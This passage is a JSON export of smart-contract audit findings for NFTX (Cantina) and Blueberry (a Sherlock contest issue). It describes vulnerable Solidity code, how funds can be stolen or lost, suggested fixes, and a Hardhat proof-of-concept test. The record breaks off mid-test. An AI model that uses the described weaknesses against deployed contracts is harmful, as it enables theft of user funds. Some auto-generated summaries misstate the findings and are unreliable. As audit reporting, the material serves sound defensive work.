      "content": "## Vulnerability Report\n\n## Context\n`MigratorZap.sol#L188-L214`\n\n## Description\nThe function `v2InventoryToXNFT()` allows a user to specify both the v2 Vault address and its id. If `vTokenV2` and `nftxVaultFactory.vault(vaultId)` mismatch, the result of `v2Inventory.withdraw(vaultIdV2, shares)` can be stuck on the contract balance (i.e., the whole execution doesn't necessarily revert in this case as there are no direct zero checks), and can be immediately stolen by the back-running `v2InventoryToXNFT()` call with `vTokenV2 = nftxVaultFactory.vault(vaultId)`:\n\n```solidity\nMigratorZap.sol#L188-L201\nfunction v2InventoryToXNFT(\n    uint256 vaultIdV2,\n    address vTokenV2,\n    ...\n) external returns (uint256 xNFTId) {\n    address xToken = v2Inventory.vaultXToken(vaultIdV2);\n    IERC20(xToken).transferFrom(msg.sender, address(this), shares);\n    v2Inventory.withdraw(vaultIdV2, shares);\n    uint256 vTokenV2Balance = IERC20(vTokenV2).balanceOf(address(this));\n}\n```\n\n## Impact\nUsers mis-specifying the token address and Vault id will have their tokens stolen. Given the low likelihood of occurrence and the high potential loss of principal funds, the severity of this issue is set to medium.\n\n## Recommendation\nConsider either:\n\n1. Controlling for `vTokenV2 == nftxVaultFactory.vault(vaultId)` \n\nor \n\n2. Calculating the `vTokenV2` balance difference before and after `v2Inventory.withdraw(vaultIdV2, shares)` and requiring it to be positive.",
      "summary": "\nThe report discusses a vulnerability in the function `v2InventoryToXNFT()` in the `MigratorZap.sol` contract. This function allows users to specify a v2 Vault address and its id. However, if the `vTokenV2` and `nftxVaultFactory.vault(vaultId)` do not match, the result of `v2Inventory.withdraw(vaultIdV2, shares)` can be stuck on the contract balance and can be stolen by another call. This can result in users losing their tokens. The severity of this issue is considered medium and the report recommends controlling for the mismatch or calculating the balance difference before and after the `v2Inventory.withdraw()` function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54557",
      "title": "When creating the vault, the forceTimelock parameter of inventoryStaking.deposit should be false. ",
      "impact": "HIGH",
      "content": "## Context\n**File:** CreateVaultZap.sol  \n**Lines:** 212-229  \n\n## Description\nWhen creating the Vault, the user can provide NFTs to add liquidity to the Pool or deposit to `inventoryStaking`. The problem here is that adding liquidity does not require timelock, while depositing to `inventoryStaking` forces timelock.\n\n```solidity\nnftxRouter.addLiquidity{value: msg.value}(\n  INFTXRouter.AddLiquidityParams({\n    vaultId: vaultId,\n    vTokensAmount: vTokensBalance,\n    nftIds: emptyIds,\n    nftAmounts: emptyIds,\n    tickLower: tickLower,\n    tickUpper: tickUpper,\n    fee: params.liquidityParams.fee,\n    sqrtPriceX96: currentSqrtPriceX96,\n    vTokenMin: params.liquidityParams.vTokenMin,\n    wethMin: params.liquidityParams.wethMin,\n    deadline: params.liquidityParams.deadline,\n    forceTimelock: false\n  })\n);\n```\n\n...\n\n```solidity\ninventoryStaking.deposit(\n  vaultId,\n  vTokensBalance,\n  msg.sender,\n  \"\",\n  false,\n  true // forceTimelock as we minted the vTokens with NFTs\n);\n```\n\nSince the first mint of the Vault doesn't charge `mintFee` (because there is no corresponding pool and `getTwapX96` returns 0), the initial add liquidity or deposit to `inventoryStaking` does not require timelock to neutralize `mintFee`. \n\nIf the user creates the Vault via `Factory.createVault` and then mints `VToken`, `mintFee` will not be charged, and later deposits to `inventoryStaking` also do not need to be locked. This would cause the user to have to lock for some time when depositing to `inventoryStaking`, which is considered high risk due to the high likelihood and medium impact.\n\n## Recommendation\nChange to:\n\n```solidity\nif (vTokensBalance > 0) {\n  // if dust above the min allowed value\n  if (vTokensBalance > MINIMUM_INVENTORY_LIQUIDITY) {\n    TransferLib.unSafeMaxApprove(\n      address(vault),\n      address(inventoryStaking),\n      vTokensBalance\n    );\n    inventoryStaking.deposit(\n      vaultId,\n      vTokensBalance,\n      msg.sender,\n      \"\",\n      false,\n      - true // forceTimelock as we minted the vTokens with NFTs\n      + false\n    );\n  }\n}\n```",
      "summary": "\nThe bug report discusses an issue with a specific file and lines of code in a program called CreateVaultZap.sol. The problem is that when a user creates a Vault, they can add NFTs to a pool or deposit them in a section called `inventoryStaking`. The issue is that adding NFTs does not require a timelock, but depositing them in `inventoryStaking` does. This creates a risk for users as they may have to wait for a certain amount of time before they can access their deposited NFTs. The recommendation is to change the code to include a check for the amount of NFTs being deposited and only force a timelock if the amount is above a certain threshold. This will reduce the risk for users and make the program more user-friendly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54556",
      "title": "NFT sale price is calculated as WETH spent on vTokens purchase and is overstated this way in royalty deductions ",
      "impact": "HIGH",
      "content": "## Context\n- `MarketplaceUniversalRouterZap.sol#L228-L250`\n- `MarketplaceUniversalRouterZap.sol#L465-L502`\n\n## Description\nThe `wethSpent` is the amount spent on vTokens, not all of which are used for NFT purchases. In fact, the amount of vTokens left is uncapped and can be arbitrarily large. This leads to overstated royalty amounts, as the actual sale price is lower than `wethSpent / tokenCount`, which is used in the `_deductRoyalty()` and `_deductRoyalty1155()` functions.\n\n## MarketplaceUniversalRouterZap.sol#L228-L250\n```solidity\n// swap WETH to vTokens\nuint256 iniWETHBal = WETH.balanceOf(address(this));\naddress vault = nftxVaultFactory.vault(vaultId);\n_swapTokens(address(WETH), vault, executeCallData);\nuint256 wethSpent = iniWETHBal - WETH.balanceOf(address(this));\nuint256 wethLeft = msg.value - wethSpent;\n// redeem NFTs. Forcing to deduct vault fees\nTransferLib.unSafeMaxApprove(address(WETH), vault, wethLeft);\nuint256 wethFees = INFTXVaultV3(vault).redeem(\n    idsOut,\n    to,\n    wethLeft,\n    vTokenPremiumLimit,\n    true\n);\nuint256 netRoyaltyAmount;\nif (deductRoyalty) {\n    address assetAddress = INFTXVaultV3(vault).assetAddress();\n    netRoyaltyAmount = _deductRoyalty(assetAddress, idsOut, wethSpent);\n}\n```\n\n## MarketplaceUniversalRouterZap.sol#L465-L502\n```solidity\n// swap some WETH to vTokens\nuint256 iniWETHBal = WETH.balanceOf(address(this));\naddress vault = nftxVaultFactory.vault(params.vaultId);\n_swapTokens(address(WETH), vault, params.executeToVTokenCallData);\nuint256 wethLeft = WETH.balanceOf(address(this));\nuint256 wethSpent = iniWETHBal - wethLeft;\n// redeem NFTs\nTransferLib.unSafeMaxApprove(address(WETH), vault, wethLeft);\nuint256 wethFees = INFTXVaultV3(vault).redeem(\n    params.idsOut,\n    params.to,\n    wethLeft,\n    params.vTokenPremiumLimit,\n    true\n);\nuint256 netRoyaltyAmount;\nif (params.deductRoyalty) {\n    address assetAddress = INFTXVaultV3(vault).assetAddress();\n    netRoyaltyAmount = _deductRoyalty(\n        assetAddress,\n        params.idsOut,\n        wethSpent\n    );\n}\n// transfer vToken dust and remaining WETH balance\n_transferDust(vault, true);\nemit Buy(\n    params.idsOut,\n    wethSpent + wethFees + netRoyaltyAmount,\n    params.to,\n    netRoyaltyAmount\n);\n```\n\n## Impact\nThe `netRoyaltyAmount` is overstated, causing users to systematically lose the extra deducted funds. Given the high likelihood and medium impact, the severity is considered high.\n\n## Recommendation\nConsider calculating the exact price of the tokens purchased, for example:\n\n```solidity\nuint256 constant BASE = 10 ** 18;\n\n// swap WETH to vTokens\nuint256 iniWETHBal = WETH.balanceOf(address(this));\naddress vault = nftxVaultFactory.vault(vaultId);\n(uint256 vTokenAmount, ) = _swapTokens(address(WETH), vault, executeCallData);\nif (vTokenAmount < idsOut.length * BASE) revert NotEnoughFundsForRedeem();\nuint256 wethSpent = iniWETHBal - WETH.balanceOf(address(this));\nuint256 wethLeft = msg.value - wethSpent;\n// redeem NFTs. Forcing to deduct vault fees\nTransferLib.unSafeMaxApprove(address(WETH), vault, wethLeft);\nuint256 wethFees = INFTXVaultV3(vault).redeem(\n    idsOut,\n    to,\n    wethLeft,\n    vTokenPremiumLimit,\n    true\n);\n// the (1 - idsOut.length * BASE / vTokenAmount) share of wethSpent is not spend,\n// but swapped to vTokens and returned to the caller via _transferDust() below\nwethSpent = (wethSpent * idsOut.length * BASE) / vTokenAmount;\nuint256 netRoyaltyAmount;\nif (deductRoyalty) {\n    address assetAddress = INFTXVaultV3(vault).assetAddress();\n    netRoyaltyAmount = _deductRoyalty(assetAddress, idsOut, wethSpent);\n}\n// transfer vToken dust and remaining WETH balance\n_transferDust(vault, true);\nemit Buy(\n    idsOut,\n    wethSpent + wethFees + netRoyaltyAmount,\n    to,\n    netRoyaltyAmount\n);\n```",
      "summary": "\nIn this bug report, the user has reported that there is a problem with the `wethSpent` variable in the `MarketplaceUniversalRouterZap.sol` file. This variable is used to calculate the amount spent on vTokens, but it is not taking into account all of the vTokens that are used for NFT purchases. This leads to an overstatement of the royalty amounts, as the actual sale price is lower than what is being calculated. This bug can have a high impact on users, as they may be losing extra funds due to this overstatement. The recommendation is to calculate the exact price of the tokens purchased to ensure that the `wethSpent` variable is accurate. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54555",
      "title": "TransferLib.transferFromERC721 doesn 't support CryptoKitties, so a range of protocol oper- ations are unavailable for them ",
      "impact": "HIGH",
      "content": "## TransferLib.transferFromERC721 Analysis\n\n## Context\n- **File:** TransferLib.sol\n- **Lines:** 81-102\n\n## Usages\n- **NFTXInventoryStakingV3Upgradeable:** Lines 201\n- **NFTXRouter:** Lines 361, 751\n- **CreateVaultZap:** Line 131\n- **MarketplaceUniversalRouterZap:** Line 566\n\n## Description\n`TransferLib.transferFromERC721` will fail for **CRYPTO_KITTIES**, which code doesn't have `safeTransferFrom()`, i.e., `TransferLib` doesn't support them (while `NFTXVaultUpgradeableV3` does):\n- **File:** TransferLib.sol\n- **Lines:** 74-106\n\n### Function Implementation\n```solidity\nfunction _transferFromERC721(\n    address assetAddr,\n    uint256 tokenId,\n    address to\n) private {\n    bytes memory data;\n    if (assetAddr != CRYPTO_PUNKS) {\n        // We push to the vault to avoid an unneeded transfer.\n        data = abi.encodeWithSignature(\n            \"safeTransferFrom(address,address,uint256)\",\n            msg.sender,\n            to,\n            tokenId\n        );\n    } else {\n        // Fix here for frontrun attack.\n        bytes memory punkIndexToAddress = abi.encodeWithSignature(\n            \"punkIndexToAddress(uint256)\",\n            tokenId\n        );\n        (bool checkSuccess, bytes memory result) = CRYPTO_PUNKS.staticcall(\n            punkIndexToAddress\n        );\n        address nftOwner = abi.decode(result, (address));\n        if (!checkSuccess || nftOwner != msg.sender) revert NotNFTOwner();\n        data = abi.encodeWithSignature(\"buyPunk(uint256)\", tokenId);\n    }\n    (bool success, bytes memory resultData) = address(assetAddr).call(data);\n    require(success, string(resultData));\n}\n```\nThis way, all the operations that use the function will be unavailable for **CRYPTO_KITTIES**, which are supported by the protocol.\n\n## Impact\n- NFTXInventoryStakingV3Upgradeable's deposit\n- NFTXRouter's selling NFTs and increasing/adding liquidity with NFTs\n- CreateVaultZap's Vault creation\n- MarketplaceUniversalRouterZap's swapping and selling\n\nAll of these operations are unavailable for **CryptoKitties**. \n\nGiven the high likelihood of this issue and the medium impact, the severity is set to high.\n\n## Recommendation\nConsider expanding `TransferLib.transferFromERC721` to include support for **CRYPTO_KITTIES**, similarly to `NFTXVaultUpgradeableV3`'s `_transferFromERC721`:\n- **File:** NFTXVaultUpgradeableV3.sol\n- **Lines:** 997-1005\n```solidity\n} else {\n    // CRYPTO_KITTIES\n    data = abi.encodeWithSignature(\n        \"transferFrom(address,address,uint256)\",\n        msg.sender,\n        address(this),\n        tokenId\n    );\n}\n```",
      "summary": "\nThe TransferLib.transferFromERC721 function is not working properly for CRYPTO_KITTIES, as it does not support the safeTransferFrom() function. This means that operations such as depositing in NFTXInventoryStakingV3Upgradeable, selling NFTs in NFTXRouter, creating vaults in CreateVaultZap, and swapping/selling in MarketplaceUniversalRouterZap are currently unavailable for CRYPTO_KITTIES. The severity of this issue is considered high and it is recommended to expand the function to include support for CRYPTO_KITTIES.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54554",
      "title": "_deductRoyalty1155 will leave part of the royalties in the contract and it can be taken out by other users ",
      "impact": "HIGH",
      "content": "## Context\n- MarketplaceUniversalRouterZap.sol#L672-L676\n- MarketplaceUniversalRouterZap.sol#L358-L370\n\n## Description\n`_deductRoyalty1155` collects royalties from ERC1155, but in the code below, the royalties are calculated as `royaltyAmount * amount`. However, only the `royaltyAmount` will be sent to the royalty owner, and the rest of the royalties of `royaltyAmount * amount - 1` will be left in the contract.\n\n```solidity\nnetRoyaltyAmount += royaltyAmount * amounts[i];\nif (royaltyAmount > 0) {\n    WETH.transfer(receiver, royaltyAmount);\n}\n...\nif (deductRoyalty) {\n    netRoyaltyAmount = _deductRoyalty1155(\n        assetAddress,\n        idsIn,\n        amounts,\n        wethAmount\n    );\n}\nwethAmount -= (wethFees + netRoyaltyAmount); // if underflow, then revert desired\n\n// convert WETH to ETH and send remaining ETH to `to`\n_wethToETHResidue(to, wethAmount);\n```\n\nOther users can call the `buyNFTsWithETH`, in `_allWethToETHResidue` all WETH in the contract will be sent to the user.\n\n```solidity\nfunction _allWethToETHResidue(\n    address to\n) internal returns (uint256 wethAmount) {\n    wethAmount = WETH.balanceOf(address(this));\n    _wethToETHResidue(to, wethAmount);\n}\n```\n\n## Recommendation\nChange to:\n\n```solidity\nfunction _deductRoyalty1155(\n    address nft,\n    uint256[] calldata idsIn,\n    uint256[] calldata amounts,\n    uint256 netWethAmount\n) internal returns (uint256 netRoyaltyAmount) {\n    bool success = IERC2981(nft).supportsInterface(_INTERFACE_ID_ERC2981);\n    if (success) {\n        uint256 salePrice = netWethAmount / idsIn.length;\n        for (uint256 i; i < idsIn.length; ) {\n            (address receiver, uint256 royaltyAmount) = IERC2981(nft)\n            .royaltyInfo(idsIn[i], salePrice);\n            netRoyaltyAmount += royaltyAmount * amounts[i];\n            if (royaltyAmount > 0) {\n                WETH.transfer(receiver, royaltyAmount * amounts[i]);\n            }\n        }\n    }\n}\n```",
      "summary": "\nThis bug report is about a code in MarketplaceUniversalRouterZap.sol that calculates royalties for ERC1155 tokens. The code currently calculates royalties as `royaltyAmount * amount`, but only `royaltyAmount` is sent to the owner while the rest stays in the contract. This can lead to an incorrect calculation of the remaining royalties. The recommendation is to change the code to a new function that properly calculates and sends the full amount of royalties to the owner. The bug can also cause all WETH in the contract to be sent to a user if they call the `buyNFTsWithETH` function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54553",
      "title": "ERC-1155 sale price is calculated from ids array length only in _deductRoyalty1155() and can be signiï¬cantly overstated ",
      "impact": "HIGH",
      "content": "## Context\n- **File:** MarketplaceUniversalRouterZap.sol#L667\n- **Description:** Since amounts can differ, the length based salePrice can be overstated:\n  - **Relevant Lines:** MarketplaceUniversalRouterZap.sol#L659-L671\n\n## Function Overview\n```solidity\nfunction _deductRoyalty1155(\n...\n) internal returns (uint256 netRoyaltyAmount) {\n    bool success = IERC2981(nft).supportsInterface(_INTERFACE_ID_ERC2981);\n    if (success) {\n        uint256 salePrice = netWethAmount / idsIn.length;\n        for (uint256 i; i < idsIn.length; ) {\n            (address receiver, uint256 royaltyAmount) = IERC2981(nft)\n                .royaltyInfo(idsIn[i], salePrice);\n            // Total NFT number needs to be used here instead.\n        }\n    }\n}\n```\n\n## Impact\nThe `salePrice` is overstated, causing users to systematically lose the extra deducted funds. This loss can be substantial, especially when amounts can be arbitrarily large, leading to the price being overstated by magnitudes. For instance, an amount of 50 would mean that 50 times the price is used for royalty deduction.\n\nGiven the high likelihood of this issue and its significant impact, the severity is categorized as critical.\n\n## Recommendation\nConsider using the total NFT amount instead of the array length, as demonstrated in the `MarketplaceUniversalRouterZap`'s `_validate1155Ids()` function:\n```solidity\nfunction _validate1155Ids(\n    uint256[] calldata ids,\n    uint256[] calldata amounts\n) internal pure returns (uint256 totalAmount) {\n    // Sum the amounts for our emitted events\n    for (uint i; i < ids.length; ) {\n        unchecked {\n            // simultaneously verifies that lengths of `ids` and `amounts` match.\n            totalAmount += amounts[i];\n            ++i;\n        }\n    }\n}\n```\n\n### Suggested Code Change\n```solidity\nfunction _deductRoyalty1155(\n...\n) internal returns (uint256 netRoyaltyAmount) {\n    bool success = IERC2981(nft).supportsInterface(_INTERFACE_ID_ERC2981);\n    if (success) {\n        // Change made here\n        // - uint256 salePrice = netWethAmount / idsIn.length;\n        // + uint256 salePrice = netWethAmount / _validate1155Ids(idsIn, amounts);\n        for (uint256 i; i < idsIn.length; ) {\n            (address receiver, uint256 royaltyAmount) = IERC2981(nft)\n                .royaltyInfo(idsIn[i], salePrice);\n        }\n    }\n}\n```",
      "summary": "\nThis report is about a bug in a code file called MarketplaceUniversalRouterZap.sol. The bug causes the sale price to be overstated, which means users are losing more money than they should. This can be a big problem, especially when dealing with large amounts of money. The report recommends changing the code to use a different method for calculating the sale price, which should fix the bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54552",
      "title": "MigratorZap 's _v2ToV3Vault() pushes the ERC-1155 tokens directly to the v3 Vault, breaking up its mint, which renders MigratorZap unavailable for ERC-1155 underlyings ",
      "impact": "HIGH",
      "content": "## Context\nMigratorZap.sol#L348-L353\n\n## Description\nThe `_v2ToV3Vault()` function redeems directly to the v3 Vault all the time. However, this approach works only for ERC-721 tokens. In the case of ERC-1155 tokens, the subsequent Vault's `mint()` function will attempt to pull the tokens in from `MigratorZap` and revert, as these token IDs have already been sent to `NFTXVaultUpgradeableV3`:\n\n```solidity\nfunction _receiveNFTs(\n    address depositor,\n    uint256[] calldata tokenIds,\n    uint256[] calldata amounts\n) internal returns (uint256) {\n    if (!allValidNFTs(tokenIds)) revert NotEligible();\n    \n    if (!is1155) {\n        address _assetAddress = assetAddress;\n        uint256 len = tokenIds.length;\n        for (uint256 i; i < len; ) {\n            uint256 tokenId = tokenIds[i];\n            \n            // We may already own the NFT here so we check in order:\n            // Does the vault own it?\n            // - If so, check if it's in holdings list\n            // - If so, we reject. This means the NFT has already been claimed for.\n            // - If not, it means we have not yet accounted for this NFT, so we continue.\n            // - If not, we \"pull\" it from the msg.sender and add to holdings.\n            _transferFromERC721(_assetAddress, tokenId);\n            if (!_holdings.add(tokenId)) revert HoldingsUpdationFailed();\n            tokenDepositInfo[tokenId] = TokenDepositInfo({\n                timestamp: uint48(block.timestamp),\n                depositor: depositor\n            });\n            unchecked {\n                ++i;\n            }\n        }\n        return len;\n    } else {\n        // This is technically a check, so placing it before the effect.\n        IERC1155Upgradeable(assetAddress).safeBatchTransferFrom(\n            msg.sender,\n            address(this),\n            tokenIds,\n            amounts,\n            \"\"\n        );\n    }\n}\n```\n\n`INFTXVaultV3(vTokenV3).mint()` will deterministically fail, causing upstream calls such as `sushi-ToNFTXAMM()`, `v2InventoryToXNFT()`, and `v2VaultToXNFT()` to revert. This affects all user-facing functions in `MigratorZap`.\n\n## Impact\nAs a result, `MigratorZap` is fully unavailable for any ERC-1155 underlyings. Given the high likelihood and significant impact, the severity is set to critical.\n\n## Recommendation\nConsider introducing handling for ERC-1155 cases, such as:\n\n```solidity\n// redeem v2 vTokens. Directly transferring to the v3 vault\nuint256[] memory idsRedeemed = INFTXVaultV2(vTokenV2).redeemTo(\n    vTokenV2Balance / 1 ether,\n    idsToRedeem,\n    is1155 ? address(this) : vTokenV3\n);\n\nif (is1155) {\n    IERC1155(INFTXVaultV3(vTokenV3).assetAddress()).setApprovalForAll(\n        vTokenV3,\n        true\n    );\n}\n```",
      "summary": "\nThe MigratorZap.sol file has a function called `_v2ToV3Vault()` that is supposed to redeem ERC-721 tokens to the v3 Vault. However, this function does not work for ERC-1155 tokens, causing errors when trying to use it. This means that the MigratorZap is not available for ERC-1155 tokens. The severity of this issue is critical and it is recommended to add handling for ERC-1155 cases in the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "24333",
      "title": "M-13: approve() call with incorrect function signature will make any SoftVault deployed with USDT as the underlying token unusable",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-07-blueberry-judging/issues/135 \n\n## Found by \nn1punp, trauki\n\nmedium\n\n\n## Summary\nOpen Zeppelin's `safeTransfer()` is used throughout the blueberry contracts, this ensures that calls to contracts without return values don't fail, however, the `EnsureApprove` contract uses a normal IERC20 interface and a normal `approve()` function call. Since USDT doesn't return a boolean as expected by the interface, this would leave the contract unusable. \n\n## Vulnerability Detail\nIf a SoftVault is deployed using USDT as the `uToken`,  the contract's main functions won't work as intended since the `ensureApprove` function call will fail. \n\n[USDT](https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#code) approve signature: `function approve(address spender, uint value) public;`\n\n[OpenZeppelin ERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol) approve signature: `function approve(address spender, uint256 value) external returns (bool);`\n## Impact\nThis will cause loss of funds because the cost to deploy the contract will essentially have been wasted. The developers explicitly stated that they intend to use USDT as an underlying token in the `SoftVault`'s NatSpec:\n![image](https://github.com/sherlock-audit/2023-07-blueberry-RohanNero/assets/100052099/9baf59fa-9de8-4406-9499-aaf45489601e)\n\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-07-blueberry/blob/main/blueberry-core/contracts/utils/EnsureApprove.sol#L27\n## Tool used\n\nManual Review\n\n## Recommendation\nAdd support for USDT by importing another interface with ERC20 functions that don't return values.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**0xyPhilic** commented:\n> invalid because the IERC20 interface would fit also USDT as it has an approve function - no function signature is used anywhere\n\n\n\n**Gornutz**\n\nItem discussed in the previous competition full context is given here - https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/15#issuecomment-1542727941 \n\n**Shogoki**\n\n> Item discussed in the previous competition full context is given here - [sherlock-audit/2023-04-blueberry-judging#15 (comment)](https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/15#issuecomment-1542727941)\n\nActually i do not understand why the issue was closed in the last contest with the comment: \n\n`USDT only can call approve function when the allowance is zero or to set the allowance to zero first.`\n\nThis is not related to the stated issue, that the approval will revert because the generic IERC20 interface is used, which is expecting a bool return data.\n\n**nevillehuang**\n\nEscalate:\n\nReferring to @Gornutz comment, this was marked as No-Fix and Non-Reward in previous contest, and should be invalid according to sherlock's [rules here](https://docs.sherlock.xyz/audits/judging/judging):\n\n> In an update contest, issues from the previous contest with wont fix labels are not considered valid.\n\nIn addition, `EnsureApprove.sol` uses `_ensureApprove()` directly to approve tokens  (for e.g. USDT) for contracts inheriting it, so the issue above of needing an interface is not a problem.\n\n**sherlock-admin2**\n\n > Escalate:\n> \n> Referring to @Gornutz comment, this was marked as No-Fix and Non-Reward in previous contest, and should be invalid according to sherlock's [rules here](https://docs.sherlock.xyz/audits/judging/judging):\n> \n> > In an update contest, issues from the previous contest with wont fix labels are not considered valid.\n> \n> In addition, `EnsureApprove.sol` uses `_ensureApprove()` directly to approve tokens  (for e.g. USDT) for contracts inheriting it, so the issue above of needing an interface is not a problem.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Shogoki**\n\n> Escalate:\n> \n> Referring to @Gornutz comment, this was marked as No-Fix and Non-Reward in previous contest, and should be invalid according to sherlock's [rules here](https://docs.sherlock.xyz/audits/judging/judging):\n> \n> > In an update contest, issues from the previous contest with wont fix labels are not considered valid.\n> \n\nHmm, yep that is kind of an interesting case. I agree, that it is probably fair in terms of rewards to consider this invalid.\nHowever as stated in my comment above, i do not understand the reasoning for closing this in the initial contest.\n\n**securitygrid**\n\nThe function signature only needs the function name and parameters, and does not need a return value.\n\n**Shogoki**\n\n> The function signature only needs the function name and parameters, and does not need a return value.\n\nWhile this is true for the call, it is still a problem as the transaction will revert because Solidity checks for the expected return size and compares it to the actual returned data size. \n\n\n**nevillehuang**\n\n> > The function signature only needs the function name and parameters, and does not need a return value.\n> \n> While this is true for the call, it is still a problem as the transaction will revert because Solidity checks for the expected return size and compares it to the actual returned data size.\n\nAs @securitygrid said, there will be no reverts, given allowance is approved to zero first. The interface only requires the function selector to match and call the function in the USDT contract [check this link here](https://medium.com/coinmonks/function-selectors-in-solidity-understanding-and-working-with-them-25e07755e976#:~:text=The%20function%20signature%20is%20derived,myFunction(address%2Cuint256)%20.)\n\n> When a contract is called, the EVM (Ethereum Virtual Machine) reads the first four bytes of the provided data to determine the function selector. The EVM uses this selector to match it with the correct function within the contract. If a match is found, the function is executed. If no match is found, the function call fails.\n\nFor example, function signature of `approve()` here would be `bytes4(keccak256(\"approve(address,uint)\"));`\n\nUnless there are two approve functions with different number of arguments, this submission seems like only a valid QA/low finding since there is only 1 approve function exposed in USDT contract\n\n**securitygrid**\n\n@nevillehuang \nThis problem should be considered from the compiled code:\nThe compiled code of `IERC20(token).approve(spender, 0)` is similar to the following:\n```solidity\n(bool ret, bytes data) = token.call(abi.encodeWithSignature(\"approve(address,uint256)\", spender, 0);\nif (ret) {\n     if (data.length != 1) // since usdt.approve has no return value, so data.length = 0\n     {\n            revert;\n     }\n     return abi.decode(data, (bool));\n} else {\n     revert;\n}\n```\n\n\n**Shogoki**\n\n> @nevillehuang This problem should be considered from the compiled code: The compiled code of `IERC20(token).approve(spender, 0)` is similar to the following:\n> \n> ```solidity\n> (bool ret, bytes data) = token.call(abi.encodeWithSignature(\"approve(address,uint256)\", spender, 0);\n> if (ret) {\n>      if (data.length != 1) // since usdt.approve has no return vault, so data.length = 0\n>      {\n>             revert;\n>      }\n>      return abi.decode(data, (bool));\n> } else {\n>      revert;\n> }\n> ```\n\nThat is correct. \n\nTo demonstrate the issue we can use the following litle PoC.\n\n1. Creating a Contract `EnsureApproveTest.sol` \n\n```solidity\n// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.16;\n\nimport {EnsureApprove} from \"./utils/EnsureApprove.sol\" ;\n\ncontract EnsureApproveTest is EnsureApprove {\n\n    function approveMe(address token, uint256 amount) external {\n        _ensureApprove(token, msg.sender, amount);\n    }\n}\n```\n\n2. Creating a Test `ensureApprove.ts` \n\n```typescript\nimport { SignerWithAddress } from \"@nomiclabs/hardhat-ethers/signers\";\nimport { ethers, upgrades } from \"hardhat\";\nimport chai, { expect } from \"chai\";\nimport { EnsureApproveTest, IERC20 } from \"../typechain-types\";\nimport { roughlyNear } from \"./assertions/roughlyNear\";\nimport { near } from \"./assertions/near\";\nimport { Contract } from \"ethers\";\n\nchai.use(roughlyNear);\nchai.use(near);\n\nconst USDT_ADDRESS = \"0xdac17f958d2ee523a2206206994597c13d831ec7\";\nconst USDC_ADDRESS = \"0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48\";\n\ndescribe(\"Ensure Approve\", () => {\n  let admin: SignerWithAddress;\n  let alice: SignerWithAddress;\n  let testContract: EnsureApproveTest;\n  let usdt: Contract;\n  let usdc: Contract;\n\n  before(async () => {\n    [admin, alice] = await ethers.getSigners();\n  });\n\n  beforeEach(async () => {\n    const EnsureApproveTest = await ethers.getContractFactory(\"EnsureApproveTest\");\n    testContract = await EnsureApproveTest.deploy();\n    usdt = await   ethers.getContractAt(\"@openzeppelin/contracts/token/ERC20/IERC20.sol:IERC20\", USDT_ADDRESS);\n    usdc = await   ethers.getContractAt(\"@openzeppelin/contracts/token/ERC20/IERC20.sol:IERC20\", USDC_ADDRESS);\n  });\n  describe(\"IERC20 Interface\", () => {\n    it(\"TEST USDC APPROVAL\", async () => {\n        const approvalBefore = await usdc.allowance(testContract.address, alice.address);\n        console.log(\"Allowance Before\", approvalBefore);\n        await testContract.connect(alice).approveMe(usdc.address, 1000);\n        const approvalAfter = await usdc.allowance(testContract.address, alice.address);\n        console.log(\"Allowance After\", approvalAfter);\n       expect(approvalAfter).to.equal(1000);\n    });\n    \n    it(\"TEST USDT APPROVAL\", async () => {\n        const approvalBefore = await usdt.allowance(testContract.address, alice.address);\n        console.log(\"Allowance Before\", approvalBefore);\n        await testContract.connect(alice).approveMe(usdt.address, 1000);\n        const approvalAfter = await usdt.allowance(testContract.address, alice.address);\n        console.log(\"Allowance After\", approvalAfter);\n        